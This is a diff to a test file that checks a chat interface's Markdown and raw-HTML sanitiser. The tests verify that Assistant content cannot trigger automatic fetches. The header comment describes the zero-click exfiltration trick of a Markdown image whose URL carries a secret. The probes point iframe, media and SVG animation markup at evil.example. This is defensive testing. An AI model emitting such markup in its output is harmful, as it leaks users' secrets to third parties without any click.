@@ -3,7 +3,7 @@
  * Markdown must not make the browser fetch anything: `![](https://x/?k=<secret>)` would send
  * the secret to `x` with no click and no approval. In Assistant content an external image is
  * a link the user may follow, and raw HTML that loads on its own is neutralised. An ordinary
- * chat renders exactly as before.
+ * chat keeps external images, and its raw HTML goes through the same sanitiser as every chat's.
  */
 import { afterAll, describe, expect, it } from "bun:test";
 import { installDom, uninstallDom, mount } from "../../helpers/react-dom";
@@ -25,6 +25,13 @@ async function render(content: string, mode: "normal" | "assistant-project" | "a
     : md);
   const root = view.container.cloneNode(true) as HTMLElement;
   await view.unmount();
+  return root;
+}
+
+/** `html` as the browser would build it with no Markdown pipeline at all, to check the probes against. */
+function rawDom(html: string): HTMLElement {
+  const root = document.createElement("div");
+  root.innerHTML = html;
   return root;
 }
 
@@ -99,9 +106,8 @@ describe("raw HTML in Assistant content", () => {
     expect(autoLoaded(root).filter((u) => u.includes("evil.example") || u.startsWith("<"))).toEqual([]);
   });
 
-  it("would have loaded every one of them in an ordinary chat (the probe sees them)", async () => {
-    const root = await render(HTML, "normal");
-    const leaks = autoLoaded(root).filter((u) => u.includes("evil.example") || u.startsWith("<"));
+  it("would load every one of them as plain DOM (the probe sees them)", () => {
+    const leaks = autoLoaded(rawDom(HTML)).filter((u) => u.includes("evil.example") || u.startsWith("<"));
     for (const tag of ["<iframe>", "<video>", "<audio>", "<object>", "<embed>", "<link>"]) expect(leaks).toContain(tag);
     expect(leaks.filter((u) => u.includes("evil.example")).length).toBeGreaterThan(5);
   });
@@ -112,9 +118,9 @@ describe("raw HTML in Assistant content", () => {
     expect([...root.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toContain(LEAK);
   });
 
-  it("is rendered as before in an ordinary chat", async () => {
+  it("is not framed in an ordinary chat either: the sanitiser every chat's raw HTML goes through drops it", async () => {
     const root = await render(`<iframe src="${LEAK}"></iframe>`, "normal");
-    expect(root.querySelector("iframe")?.getAttribute("src")).toBe(LEAK);
+    expect(root.querySelector("iframe")).toBeNull();
   });
 
   it("keeps maths rendering, whose layout styles fetch nothing", async () => {
@@ -177,12 +183,10 @@ describe("raw HTML that fetches after render or through a CSS value", () => {
     });
   }
 
-  it("would have rendered the dynamic markup in an ordinary chat (the probe sees it)", async () => {
-    // SVG only: happy-dom gives an <img> created under MathML no `style`, so React cannot
-    // mount the annotation-xml case here at all (a test-DOM gap, not a rendering one).
+  it("would keep the dynamic markup as plain DOM (the probe sees it)", () => {
+    // SVG only: happy-dom gives an <img> created under MathML no `style` (a test-DOM gap).
     const svgOnly = CASES.filter(([, html]) => html.startsWith("<svg")).map(([, html]) => html);
-    const root = await render(svgOnly.join("\n\n"), "normal");
-    const leaks = leakingAttributes(root);
+    const leaks = leakingAttributes(rawDom(svgOnly.join("\n")));
     for (const tag of ["<set>", "<animate>", "<image>", "<use>", "<foreignObject>"]) expect(leaks).toContain(tag);
     expect(leaks).toContain("rect[fill]");
   });
@@ -192,11 +196,11 @@ describe("raw HTML that fetches after render or through a CSS value", () => {
     expect(root.textContent).toContain("kept text");
   });
 
-  it("still draws a static SVG", async () => {
-    const root = await render(`<svg viewBox="0 0 10 10" width="10"><g><rect width="10" height="10" fill="red"/><path d="M0 0L9 9" stroke="blue"/></g></svg>`, "assistant-project");
-    const rect = [...root.querySelectorAll("*")].find((el) => el.tagName.toLowerCase() === "rect");
-    expect(rect?.getAttribute("fill")).toBe("red");
-    expect(root.querySelector("svg")?.getAttribute("viewBox")).toBe("0 0 10 10");
+  it("draws no author SVG, as no chat does: SVG is not on the sanitiser's allow-list", async () => {
+    for (const mode of ["assistant-project", "normal"] as const) {
+      const root = await render(`<svg viewBox="0 0 10 10" width="10"><g><rect width="10" height="10" fill="red"/></g></svg>`, mode);
+      expect(root.querySelector("svg")).toBeNull();
+    }
   });
 
   it("keeps KaTeX's own SVG and MathML (roots, arrows, fractions)", async () => {
